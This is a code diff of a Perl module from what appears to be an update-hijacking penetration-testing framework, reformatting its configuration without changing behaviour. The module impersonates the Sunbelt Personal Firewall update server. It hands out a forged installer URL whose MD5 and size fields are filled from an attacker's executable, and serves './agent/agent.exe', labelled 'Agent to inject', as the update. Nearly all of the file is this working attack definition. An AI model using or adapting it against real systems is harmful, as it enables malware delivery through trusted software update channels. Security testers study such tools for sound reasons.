@@ -27,41 +27,43 @@ use Data::Dump qw(dump);
 
 use isrcore::utils;
 
-my $base=
-{
-    'name' => 'Sunbelt Personal Firewall',
-    'version' => '1.0',
-    'appver'  => '',
-    'author' => [ 'Francisco Amato < famato +[AT]+ infobytesec.com >' ],
-    'description' => qq{},    
-    'vh' => '(updates.sunbeltsoftware.com)',
-    'request' => [
-		    {
-		    'req' => '/SPURS/spurs.asp', #regex friendly
-		    'type' => 'string', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => 0,
-		    'string' => 'http://updates.sunbeltsoftware.com/SPURS/Downloads/440/Sunbelt/SKPF/EN/4.6.1861/SPF.4.6.1861.<%RND1%>.exe?MD5=<%AGENTMD5%>&SIZE=<%AGENTSIZE%>',
-		    'parse' => 0,
-		    'file' => '',
-		    },
-		    {
-		    'req' => '.exe', #regex friendly
-		    'type' => 'agent', #file|string|agent|install
-		    'method' => '', #any
-		    'bin'    => 1,		    
-		    'string' => '',
-		    'parse' => 0,
-		    'file' => ''
-		    },
-		    
+my $base = {
+    'name'        => 'Sunbelt Personal Firewall',
+    'version'     => '1.0',
+    'appver'      => '',
+    'author'      => ['Francisco Amato < famato +[AT]+ infobytesec.com >'],
+    'description' => qq{},
+    'vh'          => '(updates.sunbeltsoftware.com)',
+    'request'     => [
+        {   'req'    => '/SPURS/spurs.asp',    #regex friendly
+            'type'   => 'string',              #file|string|agent|install
+            'method' => '',                    #any
+            'bin'    => 0,
+            'string' =>
+                'http://updates.sunbeltsoftware.com/SPURS/Downloads/440/Sunbelt/SKPF/EN/4.6.1861/SPF.4.6.1861.<%RND1%>.exe?MD5=<%AGENTMD5%>&SIZE=<%AGENTSIZE%>',
+            'parse' => 0,
+            'file'  => '',
+        },
+        {   'req'    => '.exe',                #regex friendly
+            'type'   => 'agent',               #file|string|agent|install
+            'method' => '',                    #any
+            'bin'    => 1,
+            'string' => '',
+            'parse'  => 0,
+            'file'   => ''
+        },
 
     ],
-    #Options		    
-    'options' => {  'agent'  => { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject'},
-		    'enable' => { 'val' => 1, 
-			    	  'desc' => 'Status'},
-		 }
+
+    #Options
+    'options' => {
+        'agent' =>
+            { 'val' => './agent/agent.exe', 'desc' => 'Agent to inject' },
+        'enable' => {
+            'val'  => 1,
+            'desc' => 'Status'
+        },
+    }
 };
 
 ##########################################################################
@@ -74,5 +76,5 @@ sub new {
     my $class = shift;
     my $self = { 'Base' => $base, @_ };
     return bless $self, $class;
-}            
+}
 1;
